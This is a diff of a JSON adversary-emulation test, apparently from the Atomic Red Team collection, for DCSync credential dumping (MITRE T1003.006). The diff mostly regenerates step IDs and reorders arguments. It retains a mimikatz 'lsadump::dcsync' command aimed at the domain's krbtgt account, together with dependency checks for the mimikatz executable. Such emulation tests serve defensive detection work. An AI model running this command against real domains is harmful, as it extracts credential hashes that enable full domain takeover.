@@ -7,7 +7,7 @@
   ],
   "steps": [
     {
-      "id": "40f943e3-7b55-4b61-88c6-568a3ea8385e",
+      "id": "be6ea096-30da-4cd1-aabd-f63ae0f86848",
       "type": "execute-command",
       "data": {
         "command": "#{mimikatz_path} \"lsadump::dcsync /domain:#{domain} /user:#{user}@#{domain}\" \"exit\"\n",
@@ -16,7 +16,7 @@
       "elevation_required": false
     },
     {
-      "id": "e57cec50-6f7f-4f2e-a4b9-94d9c9eab6d4",
+      "id": "8be61492-8007-4512-b8e5-61412c91a23c",
       "name": "Check dependency 1/1",
       "description": "Mimikatz executor must exist on disk and at specified location (#{mimikatz_path})\n",
       "type": "execute-command",
@@ -27,7 +27,7 @@
       "elevation_required": false
     },
     {
-      "id": "b83458f6-1ce2-4a5b-94f4-101ed11ecd7c",
+      "id": "fba872eb-9a11-4a28-ad1c-a3c9257d87dc",
       "name": "Resolve dependency 1/1",
       "description": "Mimikatz executor must exist on disk and at specified location (#{mimikatz_path})\n",
       "type": "execute-command",
@@ -38,7 +38,7 @@
       "elevation_required": false
     },
     {
-      "id": "1b60a4f4-cf1e-49ad-b8ed-8806c22dcfec",
+      "id": "647bd290-9bbd-43f3-b7e9-296bb2f49eb3",
       "name": "Re-check dependency 1/1",
       "description": "Mimikatz executor must exist on disk and at specified location (#{mimikatz_path})\n",
       "type": "execute-command",
@@ -51,37 +51,31 @@
   ],
   "flows": [
     {
-      "s": "e57cec50-6f7f-4f2e-a4b9-94d9c9eab6d4",
+      "s": "8be61492-8007-4512-b8e5-61412c91a23c",
       "p": "on-success",
-      "o": "40f943e3-7b55-4b61-88c6-568a3ea8385e"
+      "o": "be6ea096-30da-4cd1-aabd-f63ae0f86848"
     },
     {
-      "s": "e57cec50-6f7f-4f2e-a4b9-94d9c9eab6d4",
+      "s": "8be61492-8007-4512-b8e5-61412c91a23c",
       "p": "on-failure",
-      "o": "b83458f6-1ce2-4a5b-94f4-101ed11ecd7c"
+      "o": "fba872eb-9a11-4a28-ad1c-a3c9257d87dc"
     },
     {
-      "s": "b83458f6-1ce2-4a5b-94f4-101ed11ecd7c",
+      "s": "fba872eb-9a11-4a28-ad1c-a3c9257d87dc",
       "p": "on-success",
-      "o": "1b60a4f4-cf1e-49ad-b8ed-8806c22dcfec"
+      "o": "647bd290-9bbd-43f3-b7e9-296bb2f49eb3"
     },
     {
-      "s": "1b60a4f4-cf1e-49ad-b8ed-8806c22dcfec",
+      "s": "647bd290-9bbd-43f3-b7e9-296bb2f49eb3",
       "p": "on-failure",
-      "o": "40f943e3-7b55-4b61-88c6-568a3ea8385e"
+      "o": "be6ea096-30da-4cd1-aabd-f63ae0f86848"
     }
   ],
   "tags": [
-    "T1003.006",
-    "atomic-red-team"
+    "T1003",
+    "T1003.006"
   ],
   "input_arguments": [
-    {
-      "name": "mimikatz_path",
-      "type": "path",
-      "description": "Mimikatz windows executable",
-      "value": "%tmp%\\mimikatz\\x64\\mimikatz.exe"
-    },
     {
       "name": "domain",
       "type": "string",
@@ -93,6 +87,12 @@
       "type": "string",
       "description": "Targeted user",
       "value": "krbtgt"
+    },
+    {
+      "name": "mimikatz_path",
+      "type": "path",
+      "description": "Mimikatz windows executable",
+      "value": "%tmp%\\mimikatz\\x64\\mimikatz.exe"
     }
   ]
 }
